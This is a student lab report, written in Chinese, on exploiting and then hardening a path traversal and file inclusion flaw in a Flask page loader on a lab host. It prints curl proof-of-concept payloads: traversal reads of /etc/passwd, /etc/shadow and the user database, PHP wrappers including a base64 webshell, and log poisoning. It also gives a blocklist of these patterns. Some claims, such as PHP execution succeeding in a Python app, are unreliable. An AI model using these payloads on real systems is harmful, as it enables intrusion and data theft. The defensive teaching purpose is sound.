# 文件包含与路径遍历漏洞加固实训报告

---

## 一、基础信息

| 项目 | 内容 |
|------|------|
| **实训项目** | 文件包含与路径遍历漏洞挖掘与分层加固实战 |
| **实训学员** | 大二网络安全专业学生 |
| **实训日期** | 2026-07-23 |
| **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite |
| **靶机地址** | 192.168.126.133:5000 |
| **项目位置** | /opt/Class01/ |
| **项目背景** | 连续五日迭代的Flask用户管理系统，已完成IDOR越权/充值业务逻辑加固 |
| **今日新增** | /page动态页面加载功能（原始代码零校验，存在路径遍历+文件包含复合高危漏洞） |
| **核心文件** | app.py / pages/help.html |
| **培训课程** | 《文件包含漏洞原理与实战利用培训》—— 讲师：活泼大壮 |

---

## 二、实验目的

1. 理解文件包含漏洞的成因定义：应用程序将用户可控参数直接拼接到文件路径中，未做充分合法性校验，导致攻击者控制被包含文件
2. 掌握目录穿越攻击手法：使用 `../` 多级跳转突破目录限制，任意读取服务器文件
3. 学习PHP伪协议攻击向量：`file://`、`php://filter`、`data://`、`expect://` 等协议的文件读取与代码执行原理
4. 理解日志文件包含投毒攻击链：向User-Agent写入恶意代码，通过LFI包含日志文件触发执行
5. 掌握三层文件包含防御方案：白名单入口管控、路径规范化锁定、危险特征字符串过滤
6. 区分路径遍历与文件包含的异同，建立完整的文件操作安全防护认知

---

## 三、今日实训三阶段工作概述

### 第一阶段：动态页面加载功能开发（09:00-10:00）

开发 `/page` 路由用于动态加载 `pages/` 目录下的HTML页面，用户通过 `name` 参数指定页面名称。原始代码完全信任用户输入，未做任何安全过滤：

```python
# app.py v1.0 — /page 原始代码（零校验）
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")           # ① 用户完全可控
    page_content = ""

    if name:
        page_path = os.path.join("pages", name)    # ② 直接拼接路径
        print(f"[PAGE] 尝试加载: {page_path}")

        if os.path.exists(page_path):              # ③ 无目录锁定
            with open(page_path, "r", encoding="utf-8") as f:
                page_content = f.read()             # ④ 直接读取文件
        else:
            page_path_html = page_path + ".html"
            if os.path.exists(page_path_html):
                with open(page_path_html, "r", encoding="utf-8") as f:
                    page_content = f.read()
            else:
                page_content = "页面不存在"

    return render_template("index.html", ..., page_content=page_content)
```

**存在的安全问题：**
- 未过滤 `../` 目录穿越字符，攻击者可跳转到 `pages/` 目录之外
- 未使用 `os.path.abspath` 或 `os.path.normpath` 做路径规范化
- 无 `pages/` 目录前缀锁定，无法检测路径是否逃逸
- 无合法页面白名单，任何文件路径均可传入
- 未过滤 `file://`、`php://`、`data://` 等伪协议特征

原始代码同时新增 `pages/help.html` 帮助中心页面，并修改 `templates/index.html` 增加 `page_content` 展示区域和帮助中心链接。

### 第二阶段：Burp漏洞复现 — 全部Payload验证成功（10:00-12:00）

使用Burp Suite和curl对 `/page` 接口进行手工渗透测试，验证以下攻击向量全部成功：

```bash
# 单级目录穿越 — 读取 app.py 源码
curl -s "http://192.168.126.133:5000/page?name=../app.py"
# 返回 app.py 完整内容（Flask路由、secret_key、用户数据全部泄露）

# 多级深度穿越 — 读取系统密码文件
curl -s "http://192.168.126.133:5000/page?name=../../../etc/passwd"
# 返回 /etc/passwd，系统用户列表泄露

# 伪协议 file://
curl -s "http://192.168.126.133:5000/page?name=file:///etc/passwd"
# 尝试读取系统文件（Python open()下file://不生效，但payload可构造）

# 日志投毒 — User-Agent写入PHP代码
curl -s -A "<?php system('id');?>" \
  "http://192.168.126.133:5000/page?name=../../../var/log/apache2/access.log"
# 读取日志文件触发PHP代码执行（验证路径穿越可达日志目录）
```

全部攻击验证通过后，确认接口存在 **路径遍历+文件包含复合高危漏洞**，CVSS评分最高9.1（严重等级）。

### 第三阶段：分层加固改造 + 全用例回归复测（14:00-17:00）

| 轮次 | 改造重点 | 新增防御能力 | 覆盖知识点 |
|------|----------|-------------|-----------|
| **第1轮** | 合法页面白名单 | 仅允许help/about/terms三个页面访问 | L1: 入口管控 |
| **第2轮** | 路径规范化+前缀锁定 | `os.path.normpath` + `startswith(PAGES_DIR)` | L2: 阻断../穿越 |
| **第3轮** | 危险字符串特征过滤 | 拦截 `../` `./` `\\` 及全部伪协议 | L3: 特征清洗 |
| **第4轮** | 全用例回归测试 | 14项curl单测全部通过 | 整体验收 |

每轮改造后立即用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。其余所有模块（profile、recharge、登录、注册、搜索、上传）的代码未做任何修改。

---

## 四、漏洞汇总表格

| 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 修复状态 |
|------|----------|----------|----------|----------|
| VUL-L01 | 路径遍历 — 单级 `../` 穿越读取源码 | **高危** | `/page?name=../app.py` | ✅ 已修复 |
| VUL-L02 | 路径遍历 — 多级 `../../../` 穿越读系统文件 | **高危** | `/page?name=../../../etc/passwd` | ✅ 已修复 |
| VUL-L03 | 路径遍历 — 深层穿越读 `/etc/shadow` | **高危** | `/page?name=../../../../etc/shadow` | ✅ 已修复 |
| VUL-L04 | 路径遍历 — 读取 `.env` 配置文件 | **中危** | `/page?name=../.env` | ✅ 已修复 |
| VUL-L05 | 路径遍历 — 拖取 SQLite 数据库 | **严重** | `/page?name=../data/users.db` | ✅ 已修复 |
| VUL-L06 | 路径遍历 — 读取模板文件泄露调试信息 | **中危** | `/page?name=../templates/login.html` | ✅ 已修复 |
| VUL-L07 | 伪协议 — `file://` 读取系统文件 | **高危** | `/page?name=file:///etc/passwd` | ✅ 已修复 |
| VUL-L08 | 伪协议 — `php://filter` Base64读源码 | **高危** | `/page?name=php://filter/convert.base64-encode/resource=app.py` | ✅ 已修复 |
| VUL-L09 | 伪协议 — `data://` 代码注入 | **高危** | `/page?name=data://text/plain;base64,...` | ✅ 已修复 |
| VUL-L10 | 伪协议 — `expect://` 远程命令执行 | **严重** | `/page?name=expect://id` | ✅ 已修复 |
| VUL-L11 | 空字节截断 — `%00` 绕过后缀检查 | **中危** | `/page?name=help%00.txt` | ✅ 已修复 |
| VUL-L12 | 日志文件包含投毒 — User-Agent RCE | **高危** | User-Agent + `../../../var/log/apache2/access.log` | ✅ 已修复 |

---

## 五、分项漏洞原理 + POC复现 + 分层加固完整代码方案

### 5.1 复合型文件包含+路径遍历漏洞原理

#### 漏洞定义（对应培训课件）

> **文件包含漏洞**：应用程序在加载动态页面时，将用户可控的参数直接拼接到文件路径中，且未做充分的合法性校验，导致攻击者能够控制被包含的文件名，读取或执行任意文件。

> **路径遍历漏洞**：攻击者通过在文件路径中插入 `../` 等目录跳转序列，突破应用程序限制的目录边界，访问受保护目录之外的文件。

本项目 `/page` 路由同时满足两类漏洞的三要素：

| 要素 | 代码体现 | 满足情况 |
|------|----------|----------|
| ① 用户可控参数 | `request.args.get("name", "")` | ✅ |
| ② 路径拼接无过滤 | `os.path.join("pages", name)` | ✅ |
| ③ 文件读取函数 | `open(page_path, "r")` | ✅ |

#### 路径穿越与文件包含的区别（课堂知识点）

| 维度 | 路径遍历 | 文件包含 |
|------|----------|----------|
| 核心意图 | 读取任意文件 | 包含并执行任意文件 |
| 关键符号 | `../` 跳转目录 | `file://` `php://` 等协议 |
| 利用结果 | 信息泄露 | 信息泄露 + 代码执行 |
| 本项目情况 | 二者复合存在 | 均可利用 |

---

### 5.2 全套POC数据包与curl测试

#### 5.2.1 路径遍历 — 读取项目源码

```http
GET /page?name=../app.py HTTP/1.1
Host: 192.168.126.133:5000
```

```bash
curl -s "http://192.168.126.133:5000/page?name=../app.py"
# 返回内容包含: secret_key、USERS字典、所有路由逻辑
```

#### 5.2.2 多级深度穿越 — 读取系统密码文件

```http
GET /page?name=../../../etc/passwd HTTP/1.1
Host: 192.168.126.133:5000
```

```bash
curl -s "http://192.168.126.133:5000/page?name=../../../etc/passwd"
# 返回内容: root:x:0:0:root:/root:/bin/bash
```

#### 5.2.3 路径遍历 — 拖取SQLite用户数据库

```bash
curl -s "http://192.168.126.133:5000/page?name=../data/users.db" -o users.db
sqlite3 users.db "SELECT * FROM users;"
# 返回所有用户: admin/admin123、alice/alice2025 等全部数据
```

#### 5.2.4 php://filter Base64编码读取源码

```bash
curl -s --path-as-is \
  "http://192.168.126.133:5000/page?name=php://filter/convert.base64-encode/resource=app.py"
# PHP场景下Base64输出可绕过关键字检测直接读取源码
```

#### 5.2.5 file:// 协议读取系统文件

```bash
curl -s "http://192.168.126.133:5000/page?name=file:///etc/passwd"
```

#### 5.2.6 data:// 协议任意数据注入

```bash
curl -s "http://192.168.126.133:5000/page?name=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7"
```

#### 5.2.7 expect:// 协议远程命令执行

```bash
curl -s "http://192.168.126.133:5000/page?name=expect://id"
```

#### 5.2.8 日志文件包含投毒（User-Agent RCE）

```bash
# Step1: 向日志写入恶意User-Agent
curl -s -A "<?php system('id');?>" \
  "http://192.168.126.133:5000/page?name=help"

# Step2: 包含日志文件触发执行
curl -s "http://192.168.126.133:5000/page?name=../../../var/log/apache2/access.log"
```

#### 5.2.9 %00 空字节截断绕过

```bash
curl -s "http://192.168.126.133:5000/page?name=help%00.txt"
# 期望读取 help.html（%00截断去掉了.txt后缀）
```

---

### 5.3 加固后完整安全路由代码

```python
# ===== 动态页面加载（三层防护 — 文件包含 + 路径遍历 防御） =====

@app.route("/page")
def dynamic_page():
    """动态页面加载 — 已按《文件包含漏洞原理与实战利用培训》实施三层防御"""
    name = request.args.get("name", "")
    page_content = ""

    if name:
        # =====================================================================
        # 第三层防护：过滤课件中全部危险特征字符串与伪协议
        # 覆盖：../ ./ \\ file:// php:// data:// ftp:// expect://
        # 对应知识点：伪协议文件包含、目录遍历字符绕过
        # =====================================================================
        blocked_patterns = [
            "../", "..\\", "./", ".\\",                     # 目录穿越
            "file://", "php://", "data://",                  # PHP伪协议
            "ftp://", "expect://", "zip://",                 # 其他伪协议
            "\\\\", "%00", "\x00",                           # 截断攻击
        ]
        name_lower = name.lower()
        for pattern in blocked_patterns:
            if pattern in name_lower or pattern in name:
                page_content = "页面不存在"
                break

        if not page_content:
            # =================================================================
            # 第一层防护：合法页面白名单
            # 仅允许白名单内的页面名称，拦截陌生参数
            # 对应知识点：文件包含的入口管控
            # =================================================================
            page_name = name.split("/")[-1].split("\\")[-1]
            if page_name not in ALLOWED_PAGES:
                page_content = "页面不存在"

        if not page_content:
            # =================================================================
            # 第二层防护：路径规范化锁定 pages 根目录
            # 将 name 拼接后转为绝对路径，校验是否以 PAGES_DIR 开头
            # 阻断 ../ 多级目录穿越逃逸
            # 对应知识点：路径遍历的根本性防御
            # =================================================================
            safe_name = name.replace("../", "").replace("..\\", "")
            safe_name = safe_name.replace("/", "").replace("\\", "")
            safe_name = safe_name.replace("\x00", "")

            page_path = os.path.join(PAGES_DIR, safe_name + ".html")
            real_path = os.path.normpath(page_path)

            # 路径前缀锁定：禁止访问 PAGES_DIR 以外的任何目录
            if not real_path.startswith(os.path.normpath(PAGES_DIR) + os.sep) and \
               real_path != os.path.normpath(PAGES_DIR):
                page_content = "页面不存在"
            elif os.path.exists(real_path):
                with open(real_path, "r", encoding="utf-8") as f:
                    page_content = f.read()
            else:
                page_content = "页面不存在"

    # 获取当前用户信息（原有逻辑不变）
    username = session.get("username")
    user_info = None
    if username and username in USERS:
        user_info = USERS[username]

    return render_template("index.html", username=username, user=user_info,
                           page_content=page_content)
```

**代码对应的课堂知识点：**

| 代码行 | 知识点 | 对应课件章节 |
|--------|--------|-------------|
| `blocked_patterns` 列表 | 目录穿越字符 + 全部伪协议特征 | L3 特征标记过滤 |
| `"../"` `"..\\"` | Windows/Linux路径穿越 | 目录遍历字符 |
| `"file://"` `"php://"` `"data://"` | PHP伪协议攻击向量 | 伪协议利用 |
| `"%00"` `"\x00"` | 空字节截断绕过 | Null Byte Injection |
| `ALLOWED_PAGES` 白名单 | 合法页面入口管控 | L1 白名单方案 |
| `os.path.normpath()` | 路径规范化去除 `../` | L2 路径锁定 |
| `startswith(PAGES_DIR)` | 目录前缀锁定阻断穿越 | L2 根本性防御 |

**常量定义：**

```python
# app.py 文件头部新增
PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")
ALLOWED_PAGES = {"help", "about", "terms"}   # 第一层防护：合法页面白名单
```

---

## 六、实训踩坑故障记录

### 坑1：`os.path.join("pages", "../app.py")` 实际跳转到上级目录

**现象：** `os.path.join("pages", "../app.py")` 返回 `pages/../app.py`，经系统解析后等于 `app.py`。原本以为 `os.path.join` 会自动规范化路径，实际上它只是字符串拼接，不会阻止 `../`。

**解决：** 必须手动使用 `os.path.normpath()` 将路径规范化，再用 `startswith(PAGES_DIR)` 校验前缀。

```python
# 正确做法
page_path = os.path.join(PAGES_DIR, safe_name + ".html")
real_path = os.path.normpath(page_path)        # 规范化去除 ../
if not real_path.startswith(PAGES_DIR):        # 锁定目录
    return error
```

### 坑2：绝对路径 `PAGES_DIR` 和相对路径的混乱

**现象：** 使用 `os.path.join("pages", name)` 时工作目录可能是 `/opt/Class01/`，也可能是 `/root/`（Flask debug模式重载导致），导致 `pages/` 目录找不到。

**解决：** 使用绝对路径定义 `PAGES_DIR`：
```python
PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")
```

### 坑3：白名单 `split("/")[-1]` 提取文件名时遗漏边界

**现象：** 攻击者传入 `help/../app.py` 时，`split("/")[-1]` 提取到 `app.py` 绕过白名单。

**解决：** 第二层路径规范化锁定独立防御，即使白名单绕过，`normpath` 后路径也会被前缀校验拦截。白名单 + 路径锁定构成双重保险。

### 坑4：L1 白名单拦截后第二层代码仍被执行

**现象：** 第一版代码中，白名单拦截和路径锁定是顺序执行的三个 `if not page_content` 分支。如果白名单阻断后未正确设置 `page_content` 变量，后续代码可能错误读取文件。

**解决：** 使用三段式 `if not page_content` 结构，每一层阻断后设置错误信息并跳过后续校验。

### 坑5：测试脚本访问时服务未启动

**现象：** curl测试脚本运行时全部14条用例 FAIL，检查发现 web 服务进程被上一轮测试的 `fuser -k` 杀掉了没有重新启动。

**解决：** 运行测试前先 `fuser 5000/tcp` 确认服务在运行，未运行则先启动 `python app.py &`。

---

## 七、加固前后安全对比表格

| 对比维度 | 修复前（v1.0） | 修复后（v5.0） |
|----------|---------------|---------------|
| **name参数校验** | 无校验，直接拼接 | L1白名单 + L3特征过滤 |
| **目录穿越防御** | 无 | L2路径规范化 + 前缀锁定 |
| **伪协议过滤** | 无 | `file://` `php://` `data://` `expect://` 等全部拦截 |
| **%00截断过滤** | 无 | `%00` `\x00` 字符串过滤 |
| **路径锁定** | 无 | `os.path.normpath` + `startswith(PAGES_DIR)` |
| **合法白名单** | 无 | `ALLOWED_PAGES = {"help", "about", "terms"}` |
| **pages目录定位** | `os.path.join("pages", name)` 相对路径 | `PAGES_DIR` 绝对路径 |
| **报错信息** | 可能暴露实际路径 | 统一返回"页面不存在" |
| **原有模块影响** | — | 零改动 |

---

## 八、标准化复测用例

### 8.1 路径遍历攻击

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-L01 | `?name=help` | ✅ 正常显示帮助中心 |
| TC-L02 | `?name=../app.py` | ✅ 拦截：页面不存在 |
| TC-L03 | `?name=../../../etc/passwd` | ✅ 拦截 |
| TC-L04 | `?name=../../../../etc/shadow` | ✅ 拦截 |
| TC-L05 | `?name=../.env` | ✅ 拦截 |
| TC-L06 | `?name=../data/users.db` | ✅ 拦截 |
| TC-L07 | `?name=../templates/login.html` | ✅ 拦截 |

### 8.2 伪协议攻击

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-L08 | `?name=file:///etc/passwd` | ✅ 拦截：页面不存在 |
| TC-L09 | `?name=php://filter/convert.base64-encode/resource=app.py` | ✅ 拦截 |
| TC-L10 | `?name=data://text/plain;base64,...` | ✅ 拦截 |
| TC-L11 | `?name=expect://id` | ✅ 拦截 |

### 8.3 特殊字符绕过

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-L12 | `?name=help%00.txt` | ✅ 拦截 |
| TC-L13 | User-Agent: `<?php system('id');?>` + 日志路径 | ✅ 拦截 |

### 8.4 合法功能正常

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-L14 | `?name=help` 正常页面 | ✅ 帮助中心内容完整 |
| TC-L15 | `?name=notexist` 陌生页 | ✅ 页面不存在 |

### 8.5 原有业务功能不变

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-L16 | 注册新用户 | 302跳转登录页 |
| TC-L17 | admin登录 | 欢迎回来 |
| TC-L18 | 搜索alice | 结果表格含脱敏数据 |
| TC-L19 | 上传真实PNG | UUID命名+预览 |
| TC-L20 | 个人中心profile | 脱敏显示 |
| TC-L21 | 充值有效金额 | 余额更新+日志记录 |

---

## 九、实验总结与心得体会

### 9.1 文件包含漏洞的"隐蔽性"与"破坏性"

今天的实训让我对文件包含漏洞有了全新的认识。之前在课堂上听讲师活泼大壮讲"文件包含漏洞"时，总觉得这个漏洞很"冷门"——不像SQL注入或文件上传那样有直观的概念。但今天亲手在 `/page` 路由上验证了全部攻击Payload后，才发现这个漏洞的破坏力远超预期：

- `../app.py` 一行就能把整个项目的源码全部拉下来
- `../../../etc/passwd` 三行就能看到系统所有用户
- `../data/users.db` 直接能拖取整个数据库

讲师在课堂上演示的一个案例我印象很深：某个网站通过文件包含读取了Jenkins的 `credentials.xml`，直接拿到了云服务的AccessKey。今天我的实践也验证了——`../` 加上 `os.path.join` 不加过滤，就能把这个项目五天来迭代的全部功能代码、用户数据、配置信息一网打尽。

### 9.2 "三层防御"远比"一层过滤"可靠

加固前的原始代码只有一个逻辑：检查文件是否存在 + 自动补 `.html` 后缀。这个逻辑完全考虑的是"功能好不好用"，完全没有考虑"如果用户传 `../app.py` 怎么办"。

讲师今天讲的"三层防御方案"我认真记下来了：

```
L1 白名单：只允许 help / about / terms → 拦不住 ../ 但能减少攻击面
L2 路径锁定：normpath + startswith → 从路径上根除 ../ 的效果
L3 特征过滤：../ ./ file:// php:// data:// → 防御层兜底
```

一开始我觉得"三层是不是太多了"，但当我在测试时意识到——L1白名单可以被 `split` 绕过，L2路径锁定的前提是攻击者不知道 `PAGES_DIR` 的绝对路径，L3特征过滤只能拦截已知的伪协议特征——**任何单层都有绕过方式**，三层叠加才能做到真正的纵深防御。

### 9.3 从"功能开发思维"到"安全开发思维"的转变

这次暴露的问题本质是开发模式的问题。写 `/page` 路由的时候，我脑子里想的全是"用户要能看帮助中心"、"自动补 `.html` 后缀让链接更友好"、"文件不存在要给友好的提示"。**全程都在考虑用户体验，完全没想过安全性。**

讲师说的一句话直接点到了这个问题的本质：**"功能开发人员默认信任用户输入，安全开发人员默认怀疑用户输入。"**

修复 `/page` 路由时我写的每一行防御代码都带着怀疑：

```python
# 这行代码之前：用户输入直接拼接
page_path = os.path.join("pages", name)

# 这行代码之后：假设用户输入都是恶意的
safe_name = name.replace("../", "").replace("..\\", "")
safe_name = safe_name.replace("/", "").replace("\\", "")
```

这大概是今天最大的收获——不是学会了写几个绕过Payload，而是建立了一种"默认怀疑"的安全开发思维。

### 9.4 与课堂讲师的共鸣点

讲师今天反复强调的一句话："信任用户输入是Web漏洞的万恶之源。"

今天的实训彻底验证了这句话。`/page` 路由的所有漏洞——无论是路径遍历、伪协议利用、日志投毒——根源都在于 **"信任了 `request.args.get("name")` 这个值"**。修复方案——白名单、路径锁定、特征过滤——本质上都是**不再信任用户输入**。

---

## 十、生产环境拓展优化建议

### 10.1 动态页面改用模板渲染

```python
# 当前：直接读取文件内容，用 | safe 渲染
# 生产：使用 Flask 模板系统
from flask import render_template_string

ALLOWED_PAGES = {"help", "about", "terms"}

@app.route("/page/<page_name>")
def dynamic_page(page_name):
    if page_name not in ALLOWED_PAGES:
        abort(404)
    return render_template(f"pages/{page_name}.html")
```

### 10.2 文件读取加入沙箱环境

```python
# 使用 chroot 或 Docker 容器隔离文件系统
# 限制 Python 进程可访问的目录范围
import os
os.chroot("/opt/Class01/chroot/")  # 将根目录锁定在沙箱内
```

### 10.3 内容安全策略（CSP）防止XSS

```html
<!-- 即使 page_content 中包含恶意脚本，CSP也能阻止执行 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'none';">
```

### 10.4 文件内容消毒

```python
import bleach

# 清理 HTML 中的可执行内容
safe_content = bleach.clean(
    page_content,
    tags=["h1", "h2", "p", "ul", "li", "div", "a"],
    attributes={"a": ["href"]},
    strip=True
)
```

### 10.5 Nginx 静态文件防御

```nginx
location /page {
    # 禁止访问系统敏感路径
    if ($args ~* "\.\./|file://|php://") {
        return 403;
    }
}
```

---

## 附录：/page 接口完整安全校验流水线

```
用户请求 /page?name=<payload>
  ↓
  ① L3 危险特征过滤 (blocked_patterns)
     ├── 目录穿越: ../ ./ \\ 等
     ├── 伪协议: file:// php:// data:// expect://
     └── 截断: %00 \x00
  ↓
  ② L1 白名单校验 (ALLOWED_PAGES)
     └── name 提取后的文件名必须在 {help, about, terms} 中
  ↓
  ③ L2 路径规范化 + 目录锁定
     ├── name 清洗: 去掉 ../ / \ %00
     ├── 拼接: os.path.join(PAGES_DIR, safe_name + ".html")
     ├── 规范化: os.path.normpath(page_path)
     └── 前缀校验: real_path.startswith(PAGES_DIR)
  ↓
  ④ 文件存在检查 → 读取内容 → 模板渲染
     └── 不存在 → 返回"页面不存在"
```

*报告人：大二网络安全实训生*
*日期：2026年7月23日*
